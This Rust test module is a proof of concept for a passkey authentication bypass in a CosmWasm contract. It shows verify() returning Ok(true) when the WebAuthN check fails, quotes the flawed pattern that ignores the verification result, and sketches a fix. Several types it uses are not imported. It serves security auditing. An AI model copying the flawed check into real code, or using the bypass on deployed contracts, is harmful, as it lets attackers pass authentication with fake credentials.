// PoC: Demonstrate Passkey Authentication Bypass
// This test proves that verify() returns Ok(true) even when
// the underlying gRPC query fails or returns false

#[cfg(test)]
mod poc_passkey_bypass {
    use cosmwasm_std::testing::{mock_dependencies, mock_env};
    use cosmwasm_std::{from_json, Binary, ContractResult, SystemResult, QuerierResult};
    
    /// Mock querier that simulates FAILED WebAuthN verification
    /// but returns success at query level (no error thrown)
    struct FailingAuthQuerier;
    
    impl cosmwasm_std::Querier for FailingAuthQuerier {
        fn raw_query(&self, bin: &[u8]) -> QuerierResult {
            // Parse the query
            let query_str = String::from_utf8_lossy(bin);
            
            if query_str.contains("WebAuthNVerifyAuthenticate") {
                // BUG SIMULATION: Query succeeds (no error)
                // BUT returns "verification failed" in response body
                let failure_response = r#"{"verified": false, "error": "invalid_signature"}"#;
                SystemResult::Ok(ContractResult::Ok(Binary::from(failure_response.as_bytes())))
            } else {
                SystemResult::Err("Unknown query".to_string())
            }
        }
    }

    #[test]
    fn poc_verify_returns_true_on_auth_failure() {
        // Setup with our malicious querier
        let deps = Dependencies {
            storage: MockStorage::default(),
            api: MockApi::default(),
            querier: FailingAuthQuerier,
        };
        let env = mock_env();
        
        // Call the vulnerable verify function with INVALID credentials
        let result = contract::auth::passkey::verify(
            deps.as_ref(),
            Addr::unchecked("attacker"),
            "example.com".to_string(),
            &Binary::from(b"invalid_signature"),
            vec![1, 2, 3], // fake tx_hash
            &Binary::from(b"fake_credential"),
        );
        
        // PROOF OF VULNERABILITY:
        // Current code returns Ok(true) even though WebAuthN failed!
        assert_eq!(result, Ok(true), 
            "VULNERABILITY: verify() returns Ok(true) despite failed authentication!");
        
        // What SHOULD happen:
        // assert_eq!(result, Ok(false), "Authentication failed");
    }

    /// Demonstrates the exact vulnerable code flow
    #[test]
    fn poc_vulnerable_code_flow() {
        // The vulnerable pattern from passkey.rs:
        /*
        deps.querier.query_grpc(
            String::from("/xion.v1.Query/WebAuthNVerifyAuthenticate"),
            Binary::new(query_bz),
        )?;  // <-- Only checks for QUERY error, not AUTH result
        
        Ok(true)  // <-- ALWAYS returns true!
        */
        
        // The FIX should be:
        /*
        let response = deps.querier.query_grpc(...)?;
        let auth_result: QueryWebAuthNVerifyAuthenticateResponse = 
            QueryWebAuthNVerifyAuthenticateResponse::decode(response.as_slice())?;
        
        match auth_result.verified {
            Some(true) => Ok(true),
            _ => Ok(false),
        }
        */
        
        println!("CRITICAL: Current implementation trusts query success = auth success");
        println!("ATTACK: Malicious querier can return Ok(verified=false) but code ignores it");
    }
}
